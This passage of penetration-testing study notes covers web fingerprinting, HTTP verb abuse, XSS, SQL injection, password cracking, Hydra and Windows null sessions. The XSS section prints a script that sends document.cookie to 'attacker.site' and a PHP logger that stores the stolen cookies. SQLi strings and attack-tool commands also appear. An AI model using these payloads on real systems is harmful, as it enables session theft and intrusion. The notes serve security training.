                    - This phase is prone to false positives as some probes could be too mild to effectively identify a real vulnerability.
    - Web Application Attacks
        - Web Server Fingerprinting
            - Fingerprinting a web server means detecting:
                - The daemon providing the web server service, such as IIS, Apache, nginx, and others.
                - Its version.
                - The operating system of the machine hosting the server.
            - Fingerprinting with Netcat:
                - Netcat is a very popular tool that is also known as the "TCP/IP Swiss army Knife". You can use Netcat in many different ways; it can be both a server or a client.
                - To fingerprint a web server you can use Netcat as a client to manually send requests to the server.
                - Banner grabbing: to grab a banner you just have to connect to a listening daemon and then read the banner it sends back to your client.
                - To connect to an HTTP server you have to pass the destination host and the destination port to Netcat. Most of the time, you will just use the default HTTP port (80). -- `nc <target address> 80`
                - After connecting, you have to send a valid HTTP request, which you can do by using the HEAD HTTP Verb. This verb requests the header of a resource (a web page for example).
                - Remember that every HTTP request has two empty lines between the header and the body of the request itself, so when sending body-less request like HEAD, you still have to append two empty lines. -- `nc <target> 80 \nHEAD / HTTP/1.0`
                - After sending the two empty lines, the target server will process your request and send a response message back.
                - Most of the time the response contains a `Server:` header containing information about the web server and, sometimes, the server operating system.
                - Common Mistakes:
                    - Beware of a couple of common mistakes when fingerprinting web servers with Netcat:
                        - You have to write the request in UPPERCASE.
                        - Netcat does not notify you after the connection to the server; you must write your request after running the command. You can change this behavior by using the verbose (-v) command line switch.
                        - Netcat does not perform any kind of encryption, so you cannot use it to connect to an HTTPS daemon.
            - Fingerprinting with OpenSSL:
                - The openssl command is a command line interface to manually use various features of the OpenSSL SSL/TLS toolkit.
                - You can use it to establish a connection to an HTTPS service and then send the usual HEAD HTTP Verb.
                - ```shell
openssl s_client -connect <target site>:443
HEAD / HTTP/1.0```
            - Limits of Manual Fingerprinting:
                - When performing fingerprinting, one thing to note is that system administrators can customize web servers banners; this is to make the fingerprinting activity harder for attackers.
                - Automatic tools go beyond banner grabbing. They fingerprint web servers by checking small implementation-dependent details such as:
                    - Headers ordering in response messages
                    - Errors handling
            - Fingerprinting with Httprint
                - Httprint is a web server fingerprinting tool that uses a signature-based technique to identify web servers.
                - The most used syntax is pretty simple: `httprint -P0 -h <target hosts> -s <signature file>`
                    - -P0 to avoid pinging the host (most web servers do not respond to ping echo requests)
                    - -h <target hosts> tells the tool to fingerprint a list of hosts. It is advised to use the IP address of the hosts you want to test. You can also provide a range of IP addresses
                    - -s set the signature file to use
        - HTTP Verbs
            - The most common HTTP methods are:
                - GET 
                - POST
                - HEAD
                - PUT DELETE
            - GET:
                - GET is used to request a resource. When a user wants to open a web page, the browser sends a GET request.
                    - ```html
GET /page.php HTTP/1.1
Host: www.example.site```
                - GET can also pass arguments to the web application.
                    - ```javascript
GET /page.php?course=PTS HTTP/1.1
Host: www.example.site```
            - POST:
                - POST is used to submit HTML form data. POST parameters must be in the message body.
                    - ```javascript
POST /login.php HTTP/1.1
Host: www.example.site

username=john&password=mypass```
            - HEAD:
                - HEAD is very similar to GET, as it asks just headers of the response instead of the response body.
                    - ```javascript
HEAD / HTTP/1.1
Host: www.example.site```
            - PUT:
                - PUT is used to upload a file to the server. As you can imagine, it is a very dangerous feature if it is allowed and mis-configured.
                    - ```javascript
PUT /path/to/destination HTTP/1.1
Host: www.example.site

<PUT data>```
            - DELETE:
                - DELETE is used to remove a file from the server; this is another feature that must be configured wisely as a misused DELETE leads to denial of service and data loss.
                    - ```javascript
DELETE /path/to/destination HTTP/1.1
Host: www.example.site```
            - OPTIONS:
                - OPTIONS is used to query the web server for enabled HTTP Verbs.
                    - ```javascript
OPTIONS / HTTP/1.1
Host: www.example.site```
            - REST APIs:
                - Representation State Transfer Application Programming Interface -- existence of web applications.
                - REST APIs are a specific type of web application that relies strongly on almost all HTTP Verbs.
                - They are often referred to as "web services" or simply "APIs".
                - It is common for such applications to use "PUT" for saving data and not for saving files.
                - Before you report that a "PUT/DELETE" method was found during a penetration testing engagement, you should confirm its exact impact twice.
                - It is sometimes easy to confuse REST API's PUT method, which simply creates new content with a PUT method that allows us to create an arbitrary file.
                - After issuing a PUT request, you should try to look for the existence of the file you created.
            - Using HTTP 1.0 Syntax:
                - Using the HTTP 1.1 syntax implies also sending a Host: header in your request. If you use HTTP 1.0, you can skip the Host: header.
                - `OPTIONS / HTTP/1.0`
            - Exploiting Misconfigured HTTP Verbs:
                - Enumeration with OPTIONS:
                    - You can do that by sending an OPTIONS message with Netcat.
                    - ![](https://firebasestorage.googleapis.com/v0/b/firescript-577a2.appspot.com/o/imgs%2Fapp%2FSoldieR%2FUjGOlKLZe2.png?alt=media&token=923630fb-0d4c-4719-b48a-afdbcec9ccbb)`IMG`
                - Exploiting DELETE:
                    - To exploit the DELETE verb, you just have to specify the file you want to delete from the server; this shows how an unauthenticated DELETE method can remove an arbitrary resource on the server.
                    - `IMG`
                - Exploiting PUT:
                    - Exploiting a PUT method is more complex because you have to know the size of the file you want to upload on the server. To do that you can use the Unix utility wc (word counter) with its -m parameter to count how long, in bytes, your payload is.
                    - `IMG`
                - Uploading a PHP Shell with PUT:
                    - The following code contains a small but effective PHP shell.
                    - `IMG`
                    - Remember that PUT requires that we pass the content length. 
                    - Then valid PHP script.
                    - `IMG`
        - Directories and File Enumeration
            - Users or search engines can not find resources that are not linked by a web page on the internet.
            - Enumeration helps you find those "hidden" resources that often contain:
                - New and untested features
                - Backup files
                - Testing information
                - Developer's notes
                - and many other types of information left there because "no one knows their URL".
            - Discovering unpublished, old or backup files can give you a lot of information and sometimes access to very sensitive files.
            - There are two ways to enumerate resources:
                - Pure brute-force
                - Dictionary attacks
            - Brute-force Enumeration:
                - Pure brute-force is very simple; you have to try every possible combination of characters; this is the only way to test for every possible resource name. On the other hand, this method is very inefficient since you will test a lot of non-existing resources.
            - Dictionary-based Enumeration:
                - So another, faster, way to enumerate resources is to use a list of common file names, directory names and files extensions.
                - Using a dictionary to enumerate web resources is much more efficient than using pure brute force.
            - Enumerating Web Resources with Dirbuster:
                - Even if you have a dictionary at your disposal, testing all common resources names and extensions by hand would be impractical. Fortunately, this testing process can be automated.
                - A very common tool to perform web enumeration is OWASP Dirbuster. It is java application that can perform web resources enumeration.
                - To use it you have to set your target (i.e., the URL of the site you want to test)
                - You can then choose if you want to perform a pure brute-force or a dictionary-based brute-force.
                - By clicking on the Browser button, you can specify the list to use for your tests.
                - Then, you can set the testing options.
            - Enumerating Web Resources with Dirb:
                - There is a Linux alternative to Dirbuster, called Dirb.
                - Dirb is a command line tool which also helps to enumerate web resources within an application.
        - Google Hacking
            - Another way to find files and directories on a web site is to use advanced search engine features.
            - A penetration tester can use Google's advanced query commands, also known as Google Dorks, to find specific resources.
            - Google dorks are a special combination of Google commands used to find specific resources or web pages.
            - Here are some useful search commands:
                -  ![](https://firebasestorage.googleapis.com/v0/b/firescript-577a2.appspot.com/o/imgs%2Fapp%2FSoldieR%2FYXLNlze7bS.png?alt=media&token=1972c949-91f0-4d0e-819e-ba53cdb1befb)
            - Resources:
                - [Book](https://www.amazon.com/Google-Hacking-Penetration-Testers-Johnny/dp/1597491764/ref=sr_1_1?ie=UTF8&qid=1302083660&sr=8-1)
                - [Documentation](https://developers.google.com/custom-search/docs/xml_results)
                - [Google Hacking Database](https://www.exploit-db.com/google-hacking-database
)
        - Cross Site Scripting
            - Cross Site Scripting (XSS) is a vulnerability that lets an attacker control some of the content of a web application.
            - By exploiting a Cross Site Scripting, the attacker can target the web application users.
            - By using an XSS, an attacker can:
                - Modify the content of the site at run-time;
                - Inject malicious contents;
                - Steal the cookies, thus the session, of a user;
                - Perform actions on the web application as if it was a legitimate user;
                - And much more!
            - XSS Actors:
                - The actors involved in an XSS attack are:
                    - The vulnerable web site
                    - The victim user (visitor of the website)
                    - The penetration tester
                - Vulnerable Web Applications:
                    - A vulnerable web application is what makes XSS attacks possilble.
                    - XSS vulnerabilities happen when a web application uses unfiltered user input to build the output content displayed to its end users; this lets an attacker control the output HTML and JavaScript code, thus attacking the application users.
                    - In this kind of attack, user input is any parameter coming from the client side of the web app, such as:
                        - Request headers
                        - Cookies
                        - Form inputs
                        - POST parameters
                        - GET parameters
                    - All these input channels should be validated server side by well-implemented security functions that should sanitize or filter users' input.
                    - The only way to prevent a cross-site scripting vulnerability is to never, ever, trust user input!
                - Users:
                    - Most of the time, the victims of XSS attacks are the users or the visitors of a site. Keep in mind that one of the users could be an administrator of the website itself!
                    - XSS involves injecting malicious code into the output of a web page. This malicious code is then rendered (or executed) by the browser of the visiting users.
                    - Moreover,if a web application is vulnerable to XSS, it can be really hard for a victim to realize that an attack is in progress; most of the time, attacks are very subtle and do not involve any visible change on the vulnerable site.
                - Attackers:
                    - Malicious users exploit XSS vulnerabilities to attack the users of a web site by:
                        - Making their browsers load malicious content
                        - Performing operations on their behalf, like buying a product or changing a password
                        - Stealing their session cookies, thus being able to impersonate them on the vulnerable site
                    - Impersonating a user can lead to an entire web site takeover.
            - Finding an XSS:
                - To find an XSS you have to look at every user input, and test if it is somehow displayed on the output (reflection point) of the web application.
                - After finding a reflection point, you have to understand if you can inject HTML code and see if it somehow gets to the output of the page; this lets you control the output page!
                - You can use any valid HTML tag and try to understand if it gets to the page. Looking at the HTML sources of the output page helps to understand how to build an XSS payload.
                - Sometimes it is just a matter of injecting a harmless tag like <i>, <pre>, or <plaintext>.
                - To test XSS, you can inject some valid HTML/ JavaScript code, like `<script>alert('XSS')</script>`
                - To exploit an XSS vulnerability that you find, you need to know the type of cross-site scripting attack you are carrying out. Cross-site scripting vulnerabilities can be reflected, persistent or DOM Based.
            - Reflected XSS Attacks:
                - Reflected attacks happen when the malicious payload is carried inside the request that the browser of the victim sends to the vulnerable website.
                - They could be triggered by posting a link on a social network or via a phishing campaign. When users click on the link, they trigger the attack.
                - Reflected XSS Filters:
                    - Some browsers, like Google Chrome, have a reflected XSS filter built in. This means that they will not run some XSS reflected attacks.
                    - The reality is that they can only filter trivial and known XSS attacks. There are advanced attacks that can bypass Anti-XSS filters.
                - Persistent XSS Attacks:
                    - Persistent XSS attacks occur when the payload is sent to the vulnerable web server and then stored. When a web page of the vulnerable website pulls the stored malicious code and puts it within the HTML output, it will deliver the XSS payload.
                    - It is called persistent because the malicious code gets delivered each and every time a web browser hits the "injected" web page.
                    - This is a very dangerous form of XSS because, with a single attack, the hacker can exploit multiple web application users.
                    - The most common vector for persistent attacks are HTML forms that submit content to the web server and then display that content back to the users.
                    - Elements such as comments, user profiles, and forum posts are a potential vector for XSS attacks.
                - Cookie Stealing via XSS:
                    - JavaScript can access cookies if they do not have the HttpOnly flag enabled; this means that an XSS attack can be used to steal the cookies. In many cases, stealing a cookie means stealing a user session!
                    - `<script> alert(document.cookie)</script>`
                    - ```javascript
<script>
  var i=new Image();
	i.src="http://attacker.site/log.php?q="+document.cookie;
</script>```
                    - The log.php script saves the cookie in a text file on the attacker.site:
                    - ```javascript
<?php
$filename="/tmp/log.txt";
$fp=fopen($filename, 'a');
$cookie=$_GET['q'];
fwrite($fp, $cookie);
fclose($fp);
?>```
                - Resources:
                    - The Web Application Hacker's Handbook
                    - OWASP-XSS
        - SQL Injections
            - SQL Injection (SQLi) attacks allow an unauthorized user to take control over SQL statements used by a web application.
            - This kind of attack has a huge impact on a web site because getting control over a backend database means controlling:
                - User's credentials
                - Data of the web application
                - Credit card numbers
                - Shopping transactions
                - And much more!
            - SQL Statements:
                - `SELECT name, description FROM products WHERE id=9;`
                - `SELECT <columns list> FROM <table> WHERE <condition>;`
                - `<SELECT statement> UNION <other SELECT statement>;`
                - Comments -- # or --
                    - `SELECT field FROM table; # this is a comment`
                    - `SELECT field FROM table; -- this is another comment`
            - SQL Queries Inside Web Applications:
                - To perform the same above tasks from within a web application, the application must:
                    - Connect to the database
                    - Submit the query to the database
                    - Retrieve the results
            - Vulnerable Dynamic Queries:
                - ![](https://firebasestorage.googleapis.com/v0/b/firescript-577a2.appspot.com/o/imgs%2Fapp%2FSoldieR%2F0DWCpNd_S6.png?alt=media&token=10ca7bdf-0554-4c55-ac01-4ad07ffa8d85)
                - This behavior is very dangerous because a malicious user can exploit the query construction to take control of the database interaction.
                - ![](https://firebasestorage.googleapis.com/v0/b/firescript-577a2.appspot.com/o/imgs%2Fapp%2FSoldieR%2FZB7FxtUFAT.png?alt=media&token=802054b5-b4af-46ba-940e-3aaedf219b39)
                - The query then becomes:
                - ![](https://firebasestorage.googleapis.com/v0/b/firescript-577a2.appspot.com/o/imgs%2Fapp%2FSoldieR%2F4Of83lZg9c.png?alt=media&token=8d17fa94-6a0d-4a4e-9c99-fc86a31b8f78)
                - ![](https://firebasestorage.googleapis.com/v0/b/firescript-577a2.appspot.com/o/imgs%2Fapp%2FSoldieR%2FJw-Fx3n7R6.png?alt=media&token=58dd4555-76e8-4f44-8c04-c0242de4e832)
                - Then the query becomes:
                - ![](https://firebasestorage.googleapis.com/v0/b/firescript-577a2.appspot.com/o/imgs%2Fapp%2FSoldieR%2Faw0OWzRQ-x.png?alt=media&token=4fe5f85e-0e27-43d8-a088-914bbf509394) 
            - Finding SQL Injections:
                - To exploit a SQL injection, you first have to find where the injection point is, then you can craft a payload to take control over a dynamic query.
                - To identify an injection point, you have to test every supplied user input used by the web application.
                - When we talk about a web app, user inputs are:
                    - GET parameters
                    - POST parameters
                    -  HTTP Headers
                        - User-Agent
                        - Cookie
                        - Accept
                        - many more...
                - Every input must be tested to conduct a professional pentest!
                - Testing an input for SQL injections means trying to injecct:
                    - String terminators: ' and "
                    - SQL commands:  SELECT, UNION, and others
                    - SQL comments: # or --
                - Also, check if the web application starts to behave oddly. Remember, always test one injection at a time! Otherwise you will not be able to understand what injection vector is successful.
                - From Detection to Exploitation:
                    - Finding a possible injection point is just one part of the job. To successfully exploit a SQL injection you need to know the right techniques.
                    - Then, after finding the best way to manually exploit an injection, you can efficiently automate the exploitation using automatic tools.
            - Boolean Based SQL Injections:
                - ![](https://firebasestorage.googleapis.com/v0/b/firescript-577a2.appspot.com/o/imgs%2Fapp%2FSoldieR%2FBBxV8Q2JeK.png?alt=media&token=1cd0d28d-c55f-4b6d-a13a-fd82e3a9e8d5)
                - When crafting a Boolean based SQLi payload, you want to transform a query in a True/False condition, which reflects its state to the web application output.
                - Examples to test:
                    - ' OR 'a'='a
                    - ' OR '1'='1
                    - ' OR '1'=`11
                - Exploiting a Boolean Based SQLi:
                    - user() returns the name of the user currently using the database.
                    - substring() returns a substring of the given argument. It takes three parameters: the input string, the position of the substring and its length.
            - UNION Based SQL Injections:
                - ![](https://firebasestorage.googleapis.com/v0/b/firescript-577a2.appspot.com/o/imgs%2Fapp%2FSoldieR%2FZ-xzkYFGKd.png?alt=media&token=40f17c83-72c1-4788-94d0-4dcacb5b2c74)
                - The payload forces the web application to display the result of the user() function on the output page
                - Please also note a little trick we used in the payload: the comment is not just two dashes and a space, it also contains a third dash.
                - This because most of the browsers automatically remove trailing spaces in the URL so, if you need to inject a comment via a GET request, you have to add a character after the trailing space of the comment.
                - Avoiding SQL Disaster:
                    - When attacking an SQL vulnerability you should keep in mind that not only SELECT type queries can be vulnerable.
                    - ![](https://firebasestorage.googleapis.com/v0/b/firescript-577a2.appspot.com/o/imgs%2Fapp%2FSoldieR%2FsW0-oT8WVv.png?alt=media&token=f1237aa3-f0b3-489e-950f-08157a780ed0)
                    - ![](https://firebasestorage.googleapis.com/v0/b/firescript-577a2.appspot.com/o/imgs%2Fapp%2FSoldieR%2F8QBzni0JQ0.png?alt=media&token=54bfd123-3ec4-4c71-b562-1500992f175b)
                    - When injecting to a SQL query, you should have a brief idea of what it does. To understand it, you can always think about what the outcome of the application functionality of where you found the SQL injection.
            - SQLMap:
                -  SQLMap is an open source penetration testing tool that automates the process of detecting and exploiting SQL injection flaws and taking over of database servers.
                - The basic syntax is pretty simple: `sqlmap -u <URL> -p <injection parameter> [options]`
                - ![](https://firebasestorage.googleapis.com/v0/b/firescript-577a2.appspot.com/o/imgs%2Fapp%2FSoldieR%2FfZ_rQ0oPF_.png?alt=media&token=6e302206-ae16-4f4b-bd8e-768028419541)
                - If you have to exploit a POST parameter you have to use: `sqlmap -u <URL> --data=<POST string> -p parameter [options]`
    - System Attacks
        - Malware
            - Malware, short for "Malicious software", is any software used to misuse computer systems with the intent to:
                - Cause denial of service
                - Spy on users activity
                - Get unauthorized control over one or more computer systems
                - Cause other malicious activities
                - Malware:
                    - Malware classification is based on the behavior of the software, rather than the malicious features it provides.
                        - Virus
                        - Trojan Horses
                        - Rootkit
                        - Bootkit
                        - Backdoors
                        - Adware
                        - Spyware
                        - Greyware
                        - Dialer
                        - Key-logger
                        - Botnet
                        - Data-Stealing Malware
                        - Worm
                    - Virus:
                        - A computer virus is a small piece of code that spreads from computer to computer, without any direct action or authorization by the owners of the infected machines.
                    - Trojan Horse:
                        - A Trojan horse, as the name suggests, is a malware that comes embedded in a seemingly harmless file such as an executable, an MS Office document, a screen saver or a PDF file.
                    - Backdoor:
                        - Backdoors are software made by two components: a server and a backdoor client.
                        - The Backdoor server runs on the victim machine listening on the network and accepting connections. The client usually runs on the attacker machine, and it is used to connect to the backdoor to control it.
                        - NetBus and SubSeven are very famous, old school backdoors.
                        - But what if a wise system administrator configures the network firewall to block connections from the internet to internal machines.
                        - A well-done backdoor would use any means to make the traffic legitimate; the easiest way to achieve this is by using a Connect-back Backdoor.
                        - A connect-back backdoor, or reverse backdoor, is a common mechanism to bypass firewalls.
                        - Instead of having the victim machine act as a server and listening to the client's command, it acts as a client and connects back to the penetration tester's machine.
                        - The attacker machine would listen on a port that is known to be commonly allowed on most of the firewalls, such as port 80 (the web server port.)
                    - Rootkit:
                        - A rootkit is a malware which is designed to hide itself from users and the antivirus program in order to completely subvert the OS functioning.
                    - Bootkit:
                        - Bootkits are rootkits which circumvent OS protection mechanisms by executing during the bootstrap phase.
                        - They start before the operating system, so they get complete control over the machine and the OS.
                    - Adware:
                        - Adware is annoying software that shows advertisements to computer users.
                    - Spyware:
                        - Spyware is software used to collect information about users' activity. Spyware collects information such as:
                            - The OS installed on a machine
                            - Visited websites
                            - Passwords
                    - Greyware:
                        - Greyware is a general term used to indicate Malware which does not fall under a specific category.
                        - For example, it can be either spyware, adware or both.
                    - Dialer:
                        - A Dialer is software that tries to dial numbers on dial-up connections in order to collect money from the victim's phone bill.
                    - Keylogger:
                        - A keylogger is a special software which records every keystroke on the remote victim machine.
                        - Operations performed by keyloggers are:
                            - Recording keystrokes
                            - Recording the window name where the victim user was typing
                            - Saving the keystrokes in a log file on the victim machine
                            - Sending the logs to a server controlled by the penetration tester
                            - Hardware keyloggers, rootkit keyloggers.
                    - Bots:
                        - Bots are small pieces of software that gets installed on millions of internet-connected machines to perform Distributed Denial of Service or serving as spamming sources.
                        - These Bots are commanded remotely by a so-called Command and Control server.
                    - Ransomware:
                        - Ransomware is software that encrypts a computer or smartphone content with a secret key.
                        - It then asks its victims for a ransom to give them the content back.
                    - Data Stealing Malware:
                        - Data stealing malware has one precise goal: stealing the most important data on the victim's hard disk and sending it back to the attacker. Most of the time, this specific malware incarnation is targeted to a specific company and tailored to work on the target environment.
                    - Worms:
                        - Worms spread over the network by exploiting operating systems and software vulnerabilities. Worms can also exploit default credentials or misconfigurations to attack a service or a machine. 
        - Password Attacks
            - Passwords are the first and, most of the time, the only line of defense of systems, services and accounts against unauthorized access. To protect their users and applications, operating systems have to store passwords securely.
            - To make things harder for attackers, passwords are stored by using a one-way encryption algorithm; there is no way to know the password starting from its encrypted form.
            - Cryptographic hashing functions are used to transform a password from its clear-text form to an encrypted and safe to store form.
            - Password cracking is the process of recovering clear-text passwords starting from their hash.
            - It is basically a guessing process; the attacker tries to guess the password, hashes it and then compares the result against the password file.
            - Trying to manually crack a password is more than impractical. To automate such processes, there are two main strategies:
                - Brute force attacks
                - Dictionary attacks
            - Brute force attacks:
                - Brute force attacks are the only way to be certain of finding someone's password. To automate a brute force attack, you have to write a program which generates every possible password.
                - Given enough time, a brute force attack is always successful!
                - John the Ripper:
                    - John the Ripper is an extremely popular password cracking tool written for Unix-based operating systems. 
                    - John the Ripper can mount both brute force and dictionary-based attacks against a password database.
                    - To perform a pure brute force attack, you have to use the following syntax: `john -incremental -users:<users list> <file to crack>`
            - Dictionary Attacks:
                - Dictionary attacks do not try to generate every possible password, but they use a dictionary of common passwords, testing every single entry it contains.  
                - Dictionary attacks are faster than pure brute force attacks because even a large disctionary, in order of magnitude, is smaller than the number of possible valid passwords for an account.
                - Performing a Dictionary Attack:
                    - To carry out a dictionary attack, you need:
                        - A password file containing the hashed passwords to crack.
                        - A dictionary, or wordlist, of passwords.
                        - A tool to test every password in the wordlist against the password file.
                    - Wordlists usually contain commonly used passwords such as "admin", "password1234", etc.,
                - Weaknesses of Dictionary Attacks:
                    - Poorly chose or default passwords are more exposed to dictionary cracking.
                    - Uncommon passwords could be safe, but only a truly random and long password can be considered safe.
                    - If the password is not in the wordlist, the tool performing a dictionary attack will not be able to crack the password.
                - Mangling words:
                    - Being unable to crack a password just because of case differences or some digits at the end of a word would be a shame. Because of that, cracking tools provide some options to mangle the words in a dictionary.
                    - Some variations on "cat" could be: cat12, caT, CAT, Cat CAt, c@t and so on...
                - Dictionary Attacks with John the Ripper:
                    - `john -wordlist<=custom wordlist file> <file to crack>
                - Installing Passwords dictionaries:
                    - Seclists - `apt install seclists`
            - Rainbow Tables:
                - Rainbow tables offer a tradeoff between the processing time needed to calculate the hash of a password and the storage space needed to mount an attack.
                - The space needed to store a rainbow table depends on how many characters are allowed in a password (upper and lower case characters, digits, symbols) and its length. Moreover, the specific hash function used to store the password plays a role.
                - This approach reduces a cracking session time from days to seconds!
                - Ophrcrack:
                    - A great tool to perform rainbow cracking is ophcrack. It is a tool aimed at Windows password recovery, so you can use it only to crack Windows authentication passwords.
                    - Ophcrack can run on Windows, Linux, Unix, and OSX.
            - Hashcat
        - Buffer Overflow Attacks
            - Many different attacks widely exploit buffer overflow vulnerabilities. They work by taking control of the execution flow of a piece of software or a routine of the operating system.
            - Taking control of the execution of a program means being able to force it to behave differently compared to what the application author designed.
            - A buffer overflow attack can lead to:
                - An application or operating system crash, thus causing a denial of service.
                - Privilege escalation
                - Remote code execution
                - Security features bypass
            - Buffers:
                - A buffer is an area in the computer Random Access Memory (RAM) reserved for temporary data storage. Data such as:
                    - User input
                    - Parts of a video file
                    - Server banners received by a client application
                    - And so on
                - Buffers have a finite size; this means that they can only contain a certain amount of data.
                - If the developer of an application does not enforce buffers' limits, an attacker could find a way to write data beyond those limits, thus actually writing arbitrary code in the computer RAM; this can be exploited to get control over the program execution flow!
            - The Stack:
                - Buffers are stored in a special data structure in the computer memory called a stack.
                - A stack is a data structure used to store data.
                - The approach is called Last in First Out (LIFO) and uses two methods:
                    - Push, which adds an element to the stack
                    - Pop removes the last inserted element
                - Allocating Space on the Stack:
                    - In modern operating systems, the stack is used in a more flexible way. Even if push and pop are still used, an application can randomly access a position on the stack to read and write data.
                    - To save some stack space for later use, the application can simply reserve some memory allocations on the stack and then access them.
                - Overflows in the Stack:
                    - If an attacker can write data to another contents, exploiting the stack.
                - The Stack in an Application:
                    - The stack used by applications and operating systems does not only contain data, but also information about the execution flow.
                    - If we analyze a function call, we will see that the stack contains the function parameters, its local variables and the memory address where the execution of the program must continue after the function returns.
                    - So overwriting a function return address means getting control over the application. Moreover, if an attacker manages to write some valid code in RAM, they can force the victim function to run their code.
                    - A raw overflow that just overwrites some memory locations will crash the application, while a well-engineered attack is able to execute code on the victim machine.
                - How Buffer Overflow Attacks Work:
                    - ![](https://firebasestorage.googleapis.com/v0/b/firescript-577a2.appspot.com/o/imgs%2Fapp%2FSoldieR%2Fjii1XMNzMO.png?alt=media&token=a00e4c73-8462-42ad-b016-a7a251ea63a6)
                    - Looking at this picture you should understand that if an attacker manages to overflow Local Variable 1, they are able to overwrite Base Pointer and then Return address!
                    - If they overwrite Return Address with the right value, they are able to control the execution flow of the program!
                    - This technique can be exploited by writing custom tools and applications or by using hacking tools such as Metasploit.
                    - Being able to write a buffer overflow exploit requires a deep understanding of assembly programming, how applications and operating systems works and some exotic programming skills. 
    - Network Attacks
        - Authentication Cracking
            - Every service requiring network authentication:
                - SSH
                - Telnet
                - Remote Desktop
                - HTTP authentication
                - And more...
            - Brute Force vs Dictionary Attacks:
                - When penetration testers need to access a network service, they can try to obtain valid credentials by using brute force or dictionary attacks.
                - Performing pure brute force attacks over a network are very impractical because of the time needed to run each probe.
                - In offline brute forcing, the time needed to test a single password is given by the processing time; during a network authentication attack, the time needed to test a password depends on many other factors.
                - Such factors include:
                    - Network latency: in other words, the time needed to transmit information from the penetration tester's machine to the target server and vice versa.
                    - Delays on the attacked service: many services wait some seconds during authentication routines with the scope of making authentication attacks even slower.
                    - Processing time on the attacked server: as in offline attacks, the target server must encrypt and check the credentials.
            - Weak and Default Credentials:
                - Because of these reasons, network authentication cracking relies almost entirely on dictionary-based attacks.
                - If a user chooses a weak password or an administrator leaves default service credentials unmodified, a dictionary attack will bypass the password protection.
            - Authentication Cracking Tools:
                - Hydra:
                    - Hydra is a fast, parallelized, network authentication cracker that supports different protocols.
                    - Hydra can attack nearly fifty different service types, including:
                        - Cisco auth
                        - FTP
                        - HTTP
                        - IMAP
                        - RDP 
                        - SMB
                        - SSH
                        - Telnet
                    - The tool can use dictionaries of usernames or passwords and can also perform pure brute force password attacks. Hydra architecture is based on modules. A module is a piece of code that lets Hydra attack a specific protocol.
                    - To get detailed information about a module you can use the "-U" command line switch: `hydra -U rdp`
                    - To launch a dictionary attack, against a service, with a list of usernames (inside users.txt file) and a list of passwords (pass.txt file), you have to use the following syntax: `hydra -L users.txt -P pass.txt <service://server> <options>`
        - Windows Shares
            - NetBIOS:
                - NetBIOS stands for Network Basic Input Output System. Servers and clients use NetBIOS when viewing network shares on the local area network.
                - NetBIOS can supply some of the following information when querying a computer:
                    - Hostname
                    - NetBIOS name
                    - Domain
                    - Network shares
                - ![](https://firebasestorage.googleapis.com/v0/b/firescript-577a2.appspot.com/o/imgs%2Fapp%2FSoldieR%2Ff6ps3eKqnv.png?alt=media&token=ab224fd5-9763-491c-94ae-7d9684242945)
                - UDP is used to perform NetBIOS name resolution and to carry other one-to-many datagram-based communications.
                - By using NetBIOS datagrams, a host can send small messages to many other hosts.
                - Heavy traffic, such as a file copy, relies on TCP by using NetBIOS sessions.
                - When an MS Windows machine browses a network, it uses NetBIOS.
                    - Datagrams to list the shares and the machines
                    - Names to find workgroups
                    - Sessions to transmit data to and from a Windows share.
            - Shares:
                - A Windows machine can share a file or a directory on the network; this lets local and remote users access the resource and, possibly, modify it.
                - Creating network shares in a Windows-based environment is fairly easy. Generally, users just need to turn on the File and Printer Sharing service and then they can start choosing directories or files to share.
                - Users can also set permissions on a share, choosing who can perform operations such as reading, writing, and modifying permissions.
                - Starting from Windows Vista, users can choose to share a single file, or use the Public directory. When sharing a single file, they can choose local or remote users to share the file with.
                - When using the Public directory, they can choose which local users can access the files on the share, but they can only allow everyone or no one in the network to access the share.
            - UNC Paths:
                - An authorized user can access shares by using Universal Naming Convention paths (UNC paths).
                - The format of a UNC path is: `\\ServerName\ShareName\file.nat`
            - Administrative Shares:
                - There are also some special default administrative shares which are used by system administrators and Windows itself:
                    - `\\ComputerName\c$` lets an administrator access a volume on the local machine. Every volume has a share (c$, D$, E$, etc.).
                    - `\\ComputerName\admin$` points to the windows installation directory.
                    - `\\ComputerName\ipc$` is used for inter-process communication. You cannot browse it via Windows Explorer.
            - Badly Configured Shares:
                - Accessing a share means having access to the resources of the computer hosting it. So, badly configured shares exploitation can lead to:
                    - Information disclosure
                    - Unauthorized file access
                    - Information leakage used to mount a targeted attack
        - Null Sessions
            - Null session attacks can be used to enumerate a lot of information. Attackers can steal information about:
                - Passwords
                - System users
                - System groups
                - Running system processes
            - Null sessions are remotely exploitable; this means that attackers can use their computers to attack a vulnerable Windows machine. Moreover, this attack can be used to call remote APIs and remote procedure calls. Because of these factors, null session attacks had a huge impact on Windows ecosystems.
            - Nowadays Windows is configured to be immune from this kind of attack. However, legacy hosts can still be vulnerable.
            - A null session attack exploits an authentication vulnerability for Windows Administrative Shares; this lets an attacker connect to a local or remote share without authentication.
            - Enumerating Windows Shares:
                - Enumerating shares is the first step needed to exploit a Windows machine vulnerable to null sessions.
                - NbtStat:
                    - In Windows, the most common command to use when enumerating Windows shares is `nbtstat`
                    - Nbtstat is a Windows command line tool that can display information about a target.
                - NET VIEW:
                    - Once an attacker knows that a machine has the File Server service running, they can enumerate the shares by using the NET VIEW command. `NET VIEW <target IP>`.
                - Nmblookup:
                    - To perform the same operations of nbtstat, you can use nmblookup with the same command line switch: `nmblookup -A <target IP address>`.
                - Smbclient:
                    - The Samba suite also provides smbclient, an FTP-like client to access Windows shares; this tool can, among other things, enumerate the shares provided by a host: `smbclient -L //<IP address> -N`
            - Checking for Null Sessions:
                - Once we have detected that the File and Printer Sharing service is active and we have enumerated the available shares on a target, it is time to check if a null session attack is possible.
                - Checking for Null Sessions with Windows:
                    - To connect: `NET USE \\<target IP address>\IPC$ ' ' /u:' ' `
                    - This tells Windows to connect to the IPC$ share by using an empty password and an empty username.
                    - The previous command establishes a connection to the IPC$ administrative share without specifying a user; this is possible because our target host is vulnerable to null session attacks. This test only works with the IPC$
                - Checking for Null Sessions with Linux:
                    - `smbclient //<target IP address>/IPC$ -N`
            - Exploiting Null Sessions:
                - Exploiting null sessions can be done by using the Windows NET command, but there are some tools which can automate this task.
                - Exploiting Null Sessions with Enum:
                    - Enum - a command line utility that can retrieve information from a system vulnerable to null session attacks.
                    - `enum -S <target IP address>` - "-S" parameter lets you enumerate the shares of a machine
                    - "-U" enumerate the users
                    - If you need to mount a network authentication attack, you ca check the password policy by using the "-P" parameter
                - Exploiting Null Sessions with Winfo:
